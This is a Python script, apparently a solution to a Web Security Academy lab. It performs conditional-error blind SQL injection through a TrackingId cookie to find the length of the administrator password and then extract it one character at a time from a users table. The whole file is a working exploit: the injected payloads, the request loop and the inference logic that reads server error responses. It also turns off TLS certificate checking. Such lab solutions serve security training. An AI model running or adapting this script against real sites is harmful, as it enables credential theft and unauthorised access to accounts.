import requests
import string
import urllib3

# Remove anoying warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# base url
url = "https://0aaf00030434dc6f8169e44e00f100e8.web-security-academy.net/filter?category=Lifestyle"

# Get the length of the password
def getleng():
    leng = 1
    while True:
        # Payload to check if the length of the password is equal to the current length
        payload = f"'||(SELECT CASE WHEN LENGTH(password)={leng} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        headers = {
            "Cookie": f"session=kp0m6fki38pB7uLnian7BDXSBsQ1ZU6k; TrackingId=3k9Up2XyFiJpfyg1{payload}",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        }
        r = requests.get(url, headers=headers, verify=False)
        # If the status code is 200, then the length of the password is NOT equal to the current length
        # keep incrementing the length until the status code is not 200 (status code 500)
        if r.status_code == 200:
            leng += 1
        else:  
            break

    return leng

# Get the password
def blind(url):
    password = ""
    leng = getleng()

    while len(password) < leng:
        i = len(password)+1
        # Loop through all the characters in the ascii_lowercase and digits
        for char in string.ascii_lowercase + string.digits:
            # Payload to check if the character is in the password at the current index 
            # if so, return 1/0 (status code 500)
            payload = f"'||(SELECT CASE WHEN SUBSTR(password, {i}, 1)='{char}' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            headers = {
                "Cookie": f"session=kp0m6fki38pB7uLnian7BDXSBsQ1ZU6k; TrackingId=3k9Up2XyFiJpfyg1{payload}",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
            }
            r = requests.get(url, headers=headers, verify=False)
            # If the status code is not 200, then the character is in the password
            if r.status_code != 200:
                # Add the character to the password
                password += char
                # show the password whitout new line
                print("Senha = ", password, end='\r')
                break

    return password

if __name__ == "__main__":
    print("Senha =", blind(url))
